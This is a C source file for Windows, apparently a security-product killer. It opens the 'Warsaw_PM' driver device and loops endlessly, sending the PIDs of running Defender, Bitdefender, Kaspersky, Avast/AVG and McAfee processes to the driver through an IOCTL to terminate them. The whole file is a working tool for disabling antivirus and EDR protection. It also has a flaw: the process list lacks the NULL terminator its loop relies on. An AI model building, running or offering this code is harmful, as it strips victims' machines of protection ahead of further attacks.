#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>
#include <tchar.h>

#define IOCTL_CODE 0x22201C
// #define IOCTL_CODE 0x222020

// AV/EDR process list
const char* PROCESSES[] = {
    // Microsoft Defender
    "MsMpEng.exe", "MsMpEngCP.exe", "MpCmdRun.exe", "NisSrv.exe",
    "SecurityHealthService.exe", "SecurityHealthHost.exe", "SecurityHealthSystray.exe",
    "MsSense.exe", "MsSecFw.exe", "MsMpSigUpdate.exe", "MsMpGfx.exe",
    "MpDwnLd.exe", "MpSigStub.exe", "MsMpCom.exe", "MSASCui.exe",
    "WindowsDefender.exe", "WdNisSvc.exe", "WinDefend.exe", "smartscreen.exe",

    // Bitdefender
    "vsserv.exe", "bdservicehost.exe", "bdagent.exe", "bdwtxag.exe",
    "updatesrv.exe", "bdredline.exe", "bdscan.exe", "seccenter.exe",

    // Kaspersky
    "avp.exe", "avpui.exe", "klnagent.exe", "klnsacsvc.exe",

    // Avast/AVG
    "AvastSvc.exe", "AvastUI.exe", "aswEngSrv.exe", "aswToolsSvc.exe",
    "avg.exe", "avgui.exe", "avgnt.exe", "avgsvc.exe",

    // McAfee
    "McAfeeService.exe", "McAPExe.exe", "mcshield.exe", "mfemms.exe",
};

DWORD FindProcessIdByName(const char* processName) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to create process snapshot (Error: %lu)\n", GetLastError());
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &pe32)) {
        printf("[!] Process32First failed (Error: %lu)\n", GetLastError());
        CloseHandle(hSnapshot);
        return 0;
    }

    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return pid;
}

int main() {
    HANDLE hDriver = INVALID_HANDLE_VALUE;
    DWORD bytesReturned;
    BYTE buffer[1036] = {0};
    BOOL success;
    DWORD targetPid;

    hDriver = CreateFileW(
        L"\\\\.\\Warsaw_PM",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hDriver == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to open driver \\\\.\\Warsaw_PM (Error: %lu)\n", GetLastError());
        return 1;
    }

    printf("[+] Driver initialized successfully! Handle: %p\n", hDriver);
    printf("[*] Scanning for target processes...\n");

    // Infinite loop to keep killing processes if they restart
    while (1) {
        for (int i = 0; PROCESSES[i] != NULL; i++) {
            targetPid = FindProcessIdByName(PROCESSES[i]);

            if (targetPid != 0) {
                printf(" -- Found %s - PID: %lu\n", PROCESSES[i], targetPid);
                printf("[*] Killing %s ...\n", PROCESSES[i]);

                // cp first 4 BYTE of
                memcpy(buffer, &targetPid, sizeof(DWORD));

                success = DeviceIoControl(
                    hDriver,
                    IOCTL_CODE,
                    buffer,
                    sizeof(buffer),
                    NULL,
                    0,
                    &bytesReturned,
                    NULL
                );

                if (!success) {
                    printf("[!] DeviceIoControl failed for PID %lu! Error: %lu\n",
                           targetPid, GetLastError());
                } else {
                    printf("[+] IOCTL 0x%08X sent for PID: %lu\n", IOCTL_CODE, targetPid);
                }
            }
        }
    }

    if (hDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(hDriver);
        printf("[*] Driver handle closed.\n");
    }

    return 0;
}